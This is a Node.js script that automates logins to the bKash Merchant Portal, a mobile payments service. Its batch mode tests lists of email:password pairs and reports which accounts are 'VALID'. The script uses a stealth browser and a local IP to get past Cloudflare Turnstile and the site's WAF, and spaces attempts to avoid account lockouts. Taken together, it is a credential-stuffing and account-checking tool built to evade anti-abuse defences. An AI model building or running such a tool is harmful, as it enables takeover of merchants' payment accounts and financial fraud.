#!/usr/bin/env node
// bKash Merchant Portal login automation — local CloakBrowser (stealth, host BD IP)
//
// Usage:
//   node bkash_login.mjs "email:password"                    # one login, verbose
//   node bkash_login.mjs --batch "a:p,b:p,c:p"               # batch, 45s gaps (avoids account locks)
//   node bkash_login.mjs --list-errors                       # print response map
//
// Response map (from live testing, Aug 2026):
//   SUCCESS    200 "Login request processed successfully."  → dashboard (associated-wallets/list)
//   INVALID_CREDS 400 MP0017 "Login Information is Incorrect" (toast)
//   INVALID_INPUT 400 MP0002  "Invalid parameters." / "Invalid Input"   (password policy / bad payload)
//   LOCKED       400 MP0029  "Maximum Failed Login Attempt Reached"     (per-account, temp)
//   LOCKED       400 MP0115  (alternate lock/anti-abuse code)
//   CAPTCHA_FAIL  —         Turnstile never produced a token
//
// Notes:
//   - Turnstile auto-solves in the stealth CloakBrowser; waits for a REAL
//     token (>20 chars in #cf-turnstile-response) before clicking, never just
//     button-enabled state.
//   - API contract: GET /api/v1/auth/rsa-key-nonce?q=<email-enc> → RSA key+nonce,
//     then POST /api/v1/auth/login {"data": "<RSA-encrypted email:password:nonce>"}.
//   - Do NOT hammer: ~5+ failed attempts per account → MP0029 lock. Batch mode
//     sleeps 45s between creds and uses a fresh context per attempt.
//   - Firefox MCP / Playwright-Firefox is hard-blocked by Cloudflare Turnstile
//     (widget never renders). CBM profiles egress via Akamai Mumbai (blocked by
//     the F5 WAF). Local CloakBrowser binary is the working stack.

import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import { writeFileSync } from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const LOGIN_URL = 'https://merchantportal.bkash.com/login';
const API = 'https://api.merchantportal.bkash.com/api/v1/auth';
const sleep = ms => new Promise(r => setTimeout(r, ms));

const ERRORS = {
  MP0017: 'INVALID_CREDS — wrong email/password ("Login Information is Incorrect")',
  MP0002: 'INVALID_INPUT — password policy or malformed payload ("Invalid Input")',
  MP0029: 'LOCKED — "Maximum Failed Login Attempt Reached", account temp-locked',
  MP0115: 'LOCKED — anti-abuse / alternate lock code',
};

async function attemptLogin(browser, email, password) {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  const page = await ctx.newPage();
  let loginResp = null;
  page.on('response', async r => {
    if (r.url().includes('/api/v1/auth/login')) {
      let b = ''; try { b = await r.text(); } catch {}
      loginResp = { status: r.status(), body: b.slice(0, 900) };
    }
  });
  try {
    await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded', timeout: 60000 });
    await page.waitForTimeout(3000);
    await page.fill('input[name=email]', email);
    await page.fill('input[name=password]', password);

    // wait for a REAL turnstile token — not just button state
    const tokenOk = await page.waitForFunction(() => {
      const inp = document.querySelector('input[name=cf-turnstile-response]');
      const btn = [...document.querySelectorAll('button')].find(b => (b.textContent || '').includes('Log In'));
      return inp && (inp.value || '').length > 20 && btn && !btn.disabled;
    }, { timeout: 120000 }).then(() => true).catch(() => false);
    if (!tokenOk) return { email, result: 'CAPTCHA_FAIL' };
    await page.waitForTimeout(1500); // let the widget settle after any re-render

    await page.locator('button:has-text("Log In")').click();
    await page.waitForTimeout(12000);

    const urlAfter = page.url();
    let status, code = '', desc = '', locked = false;
    if (loginResp) {
      status = loginResp.status;
      try {
        const j = JSON.parse(loginResp.body);
        desc = j.description || '';
        code = j.error?.errorCode || '';
        locked = /lock|failed login attempt/i.test((j.error?.messageEn || '') + ' ' + (j.error?.errorDetails?.bodyEn || ''));
      } catch {}
    }
    let result;
    if (status === 200) result = 'SUCCESS';
    else if (status === 400 && locked) result = 'LOCKED';
    else if (status === 400 && code === 'MP0002') result = 'INVALID_INPUT';
    else if (status === 400) result = 'INVALID_CREDS';
    else if (status === 403) result = 'FORBIDDEN';
    else if (status === 429) result = 'THROTTLED';
    else result = 'HTTP_' + (status ?? 'NONE');

    const toast = await page.evaluate(() =>
      [...document.querySelectorAll('[class*=toast], [role=alert]')].map(e => (e.textContent || '').trim()).filter(Boolean).slice(0, 2)
    ).catch(() => []);
    return { email, result, status, code, desc: desc.slice(0, 60), toast: toast.slice(0, 2), urlAfter };
  } catch (e) {
    return { email, result: 'ERROR', err: e.message.slice(0, 120) };
  } finally {
    await ctx.close();
  }
}

const args = process.argv.slice(2);
if (args.includes('--list-errors')) {
  for (const [k, v] of Object.entries(ERRORS)) console.log(k.padEnd(8), v);
  process.exit(0);
}

const batchIdx = args.indexOf('--batch');
const browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
try {
  if (batchIdx >= 0) {
    const creds = args[batchIdx + 1].split(',');
    const out = [];
    for (const cred of creds) {
      const [email, password] = cred.split(':');
      const r = await attemptLogin(browser, email, password);
      out.push(r);
      writeFileSync('/tmp/bkash_login_results.json', JSON.stringify(out, null, 1));
      console.log(`${email.padEnd(34)} -> ${String(r.result).padEnd(13)} ${r.code || ''} ${r.status ? 'HTTP ' + r.status : ''} | ${(r.desc || r.toast?.[0] || r.err || '').slice(0, 55)}`);
      await sleep(45000);
    }
    console.log('\nfull results: /tmp/bkash_login_results.json');
  } else {
    const [email, password] = args[0].split(':');
    const r = await attemptLogin(browser, email, password);
    console.log(JSON.stringify(r, null, 1));
    if (r.result === 'SUCCESS') console.log('\n>>> VALID — dashboard reached. Landing:', r.urlAfter);
  }
} finally {
  await browser.close();
}
